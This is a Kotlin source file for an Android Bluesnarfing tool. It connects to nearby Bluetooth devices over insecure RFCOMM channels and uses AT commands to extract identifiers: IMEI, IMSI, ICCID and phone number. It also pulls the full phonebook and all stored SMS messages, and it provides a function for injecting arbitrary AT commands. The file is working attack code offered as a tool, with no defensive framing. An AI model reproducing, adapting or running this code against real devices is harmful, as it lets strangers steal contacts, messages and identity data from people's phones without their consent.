package com.bluesnafer_pro

import android.bluetooth.*
import java.io.*
import java.util.*
import java.util.concurrent.Executors

/**
 * Real AT Injection — Bluesnarfer moderno.
 * Conecta por RFCOMM (SPP 0x1101 / HFP AG 0x111F, o canales 1..31 vía API
 * oculta) y extrae identidad del dispositivo:
 *   AT+CGSN → IMEI (con validación Luhn)
 *   AT+CIMI → IMSI
 *   AT+CCID → ICCID
 *   AT+CNUM → MSISDN
 *   AT+CPBR → agenda
 *   AT+CMGL → SMS
 */
object RealATInjection {
    private const val TAG = "RealATInjection"

    private val SPP_UUID = UUID.fromString("00001101-0000-1000-8000-00805F9B34FB")
    private val HFP_AG_UUID = UUID.fromString("0000111F-0000-1000-8000-00805F9B34FB")
    private val HFP_HS_UUID = UUID.fromString("0000111E-0000-1000-8000-00805F9B34FB")
    private val PROBE_TIMEOUT_MS = 1500L

    /** Ejecuta el ataque AT clásico (compatibilidad). */
    fun executeATInjectionAttack(device: BluetoothDevice): Map<String, Any> {
        val identity = extractDeviceIdentity(device)
        return mapOf(
            "success" to (identity["atChannelConnected"] == true),
            "response" to (identity["note"] as? String ?: "AT injection: sin respuestas del dispositivo"),
            "results" to (identity["rawResponses"] as? List<Map<String, Any>> ?: emptyList()),
            "count" to ((identity["rawResponses"] as? List<Map<String, Any>>)?.size ?: 0),
            "identity" to identity
        )
    }

    /**
     * Extracción completa de identidad: probing de canales + secuencia AT.
     * Devuelve {imei, imsi, iccid, msisdn, manufacturer, model, revision,
     * phonebook[], sms[], channel, atChannelConnected, imeiLuhnValid, ...}
     */
    fun extractDeviceIdentity(device: BluetoothDevice): Map<String, Any> {
        BluesnaferLogger.d(TAG, "AT identity extraction on ${device.address}")

        val allResponses = mutableListOf<Map<String, Any>>()

        // 1. Probar conexión SPP/HFP clásica primero
        val candidateChannels = try {
            val sdpChannels = probeSdpChannels(device)
            if (sdpChannels.isNotEmpty()) sdpChannels else (1..31 step 2).toList()
        } catch (e: Exception) {
            (1..31 step 2).toList()
        }

        var atSocket: BluetoothSocket? = null
        var activeChannel = 0

        for (channel in candidateChannels) {
            val socket = openChannel(device, channel)
                ?: continue
            try {
                socket.connect()
                val input = socket.inputStream
                val output = socket.outputStream

                output.write("AT\r\n".toByteArray(Charsets.UTF_8))
                output.flush()
                val resp = readAvailable(input, 512, PROBE_TIMEOUT_MS)

                if (resp.isNotEmpty() && resp.uppercase(Locale.ROOT).contains("OK")) {
                    atSocket = socket
                    activeChannel = channel
                    allResponses.add(mapOf("command" to "AT", "channel" to channel, "response" to resp.trim()))
                    BluesnaferLogger.d(TAG, "AT channel found: $channel")
                    break
                }
                socket.close()
            } catch (e: Exception) {
                try { socket.close() } catch (_: Exception) {}
            }
        }

        if (atSocket == null) {
            return mapOf(
                "success" to false,
                "atChannelConnected" to false,
                "note" to "Sin canal AT accesible (SPP/HFP cerrados o requiere pairing)",
                "rawResponses" to allResponses
            )
        }

        // 2. Secuencia completa de comandos sobre el canal activo
        val input = atSocket!!.inputStream
        val output = atSocket!!.outputStream

        val commands = linkedMapOf(
            "AT+CGSN" to "imei",
            "AT+CGSN=1" to "imeisv",
            "AT+CIMI" to "imsi",
            "AT+CCID" to "iccid",
            "AT+CNUM" to "msisdn",
            "AT+CGMI" to "manufacturer",
            "AT+CGMM" to "model",
            "AT+CGMR" to "revision",
            "AT+CPBR=1,250" to "phonebook",
            "AT+CMGL=\"ALL\"" to "sms"
        )

        val raw = mutableMapOf<String, String>()
        for ((cmd, key) in commands) {
            try {
                output.write("$cmd\r\n".toByteArray(Charsets.UTF_8))
                output.flush()
                val resp = readAvailable(input, 8192, PROBE_TIMEOUT_MS * 3)
                if (resp.isNotEmpty()) {
                    raw[key] = resp
                    allResponses.add(mapOf("command" to cmd, "channel" to activeChannel, "response" to resp.trim()))
                }
            } catch (e: Exception) {
                BluesnaferLogger.w(TAG, "$cmd failed: ${e.message}")
            }
        }

        try { atSocket?.close() } catch (_: Exception) {}

        // 3. Parsear resultados
        val imeiRaw = extractNumber(raw["imei"]) ?: extractNumber(raw["imeisv"])
        val imei = imeiRaw?.take(15)?.let { if (isLuhnValid(it)) it else it }
        val imeiLuhnValid = imei != null && isLuhnValid(imei)

        val identity = mutableMapOf<String, Any>(
            "success" to true,
            "atChannelConnected" to true,
            "channel" to activeChannel,
            "manufacturer" to parseAtValue(raw["manufacturer"]),
            "model" to parseAtValue(raw["model"]),
            "revision" to parseAtValue(raw["revision"]),
            "imei" to (imei ?: ""),
            "imeiLuhnValid" to imeiLuhnValid,
            "imsi" to (extractNumber(raw["imsi"]) ?: ""),
            "iccid" to (extractNumber(raw["iccid"]) ?: ""),
            "msisdn" to parseMsisdn(raw["msisdn"]),
            "phonebookCount" to 0,
            "phonebook" to emptyList<String>(),
            "smsCount" to 0,
            "sms" to emptyList<Map<String, String>>(),
            "note" to "Canal AT encontrado en RFCOMM $activeChannel"
        )

        val phonebook = parsePhonebook(raw["phonebook"])
        identity["phonebook"] = phonebook.map { it.toString() }
        identity["phonebookCount"] = phonebook.size

        val sms = parseSms(raw["sms"])
        identity["sms"] = sms
        identity["smsCount"] = sms.size

        identity["rawResponses"] = allResponses
        return identity
    }

    // ── Probing de canales ────────────────────────────────────────────────

    private fun probeSdpChannels(device: BluetoothDevice): List<Int> {
        val result = mutableListOf<Int>()
        for (uuid in listOf(HFP_AG_UUID, SPP_UUID, HFP_HS_UUID)) {
            try {
                val socket = device.createInsecureRfcommSocketToServiceRecord(uuid)
                socket.connect()
                socket.close()
                result.add(1)
                break
            } catch (_: Exception) {
                // UUID no disponible
            }
        }
        return result
    }

    private fun openChannel(device: BluetoothDevice, channel: Int): BluetoothSocket? {
        return try {
            val method = device.javaClass.getMethod("createRfcommSocket", Int::class.javaPrimitiveType)
            method.isAccessible = true
            method.invoke(device, channel) as BluetoothSocket
        } catch (e: Exception) {
            null
        }
    }

    // ── Parsing ───────────────────────────────────────────────────────────

    private fun parseAtValue(text: String?): String {
        if (text.isNullOrBlank()) return ""
        return text.lineSequence()
            .map { it.trim().removePrefix("\r").removePrefix("\n") }
            .firstOrNull { it.isNotBlank() && !it.uppercase(Locale.ROOT).startsWith("OK") && !it.startsWith("+CME") && !it.startsWith("ERROR") }
            ?.trim() ?: ""
    }

    private fun extractNumber(text: String?): String? {
        if (text.isNullOrBlank()) return null
        return Regex("\\d{10,20}").find(text)?.value
    }

    private fun parseMsisdn(text: String?): String {
        if (text.isNullOrBlank()) return ""
        val m = Regex("\\+?\\d{6,15}").find(text) ?: return ""
        return m.value
    }

    private fun parsePhonebook(text: String?): List<Pair<String, String>> {
        if (text.isNullOrBlank()) return emptyList()
        val entries = mutableListOf<Pair<String, String>>()
        val regex = Regex("""\+CPBR:\s*(\d+),"([^"]*)","(\d+)","([^"]*)"""")
        for (line in text.lines()) {
            val m = regex.find(line) ?: continue
            val name = m.groupValues[4]
            val number = m.groupValues[2]
            if (number.isNotBlank()) entries.add(name to number)
        }
        return entries
    }

    private fun parseSms(text: String?): List<Map<String, String>> {
        if (text.isNullOrBlank()) return emptyList()
        val messages = mutableListOf<Map<String, String>>()
        var current: MutableMap<String, String>? = null
        for (line in text.lines()) {
            val header = Regex("""\+CMGL:\s*(\d+),"([^"]*)","([^"]*)"[^,\r\n]*(?:,[^,\r\n]*)*""").find(line)
            if (header != null) {
                current = mutableMapOf(
                    "index" to header.groupValues[1],
                    "status" to header.groupValues[2],
                    "from" to header.groupValues[3]
                )
                messages.add(current)
                continue
            }
            if (current != null && line.isNotBlank()) {
                val clean = line.trim().removePrefix("\r")
                if (clean.uppercase(Locale.ROOT) == "OK" || clean.startsWith("+CMGL")) continue
                current["body"] = (current["body"] ?: "") + clean
            }
        }
        return messages
    }

    private fun isLuhnValid(imei: String): Boolean {
        val digits = imei.filter { it.isDigit() }.map { it - '0' }
        if (digits.size != 15) return false
        var sum = 0
        for (i in digits.indices) {
            var d = digits[i]
            if (i % 2 == 0) {
                d *= 2
                if (d > 9) d -= 9
            }
            sum += d
        }
        return sum % 10 == 0
    }

    private fun readAvailable(input: InputStream, maxLen: Int, timeoutMs: Long): String {
        val buffer = ByteArray(maxLen)
        var total = 0
        val deadline = System.currentTimeMillis() + timeoutMs
        while (total < buffer.size && System.currentTimeMillis() < deadline) {
            try {
                if (input.available() > 0) {
                    val read = input.read(buffer, total, buffer.size - total)
                    if (read < 0) break
                    total += read
                } else {
                    Thread.sleep(20)
                }
            } catch (e: IOException) {
                break
            }
        }
        return String(buffer, 0, total, Charsets.UTF_8)
    }

    /**
     * Injecta un comando AT específico (compatibilidad).
     */
    fun inject(device: BluetoothDevice, command: String, onLog: (String) -> Unit): Map<String, Any> {
        BluesnaferLogger.d(TAG, "AT Injection - command: $command")
        onLog("[AT] Injecting command: $command")

        return try {
            val sppUUID = UUID.fromString("00001101-0000-1000-8000-00805F9B34FB")

            val socket = device.createInsecureRfcommSocketToServiceRecord(sppUUID)
            socket.connect()
            onLog("[AT] ✓ Connected for AT commands")

            val input = socket.inputStream
            val output = socket.outputStream

            val atCmd = if (command.startsWith("AT")) command else "AT+$command"
            if (!atCmd.endsWith("\r\n")) {
                output.write((atCmd + "\r\n").toByteArray(Charsets.UTF_8))
            } else {
                output.write(atCmd.toByteArray(Charsets.UTF_8))
            }
            output.flush()

            onLog("[AT] Command sent, waiting for response...")
            val responseStr = readAvailable(input, 2048, PROBE_TIMEOUT_MS * 2)

            if (responseStr.isNotEmpty()) {
                onLog("[AT] Response: $responseStr")
                socket.close()
                return mapOf(
                    "success" to responseStr.contains("OK"),
                    "response" to responseStr.trim()
                )
            }

            socket.close()
            onLog("[AT] ✗ No response received")
            mapOf("success" to false, "response" to "No response")
        } catch (e: Exception) {
            BluesnaferLogger.e(TAG, "AT inject error: ${e.message}")
            onLog("[AT] ✗ Error: ${e.message}")
            mapOf("success" to false, "response" to (e.message ?: "Unknown error"))
        }
    }
}
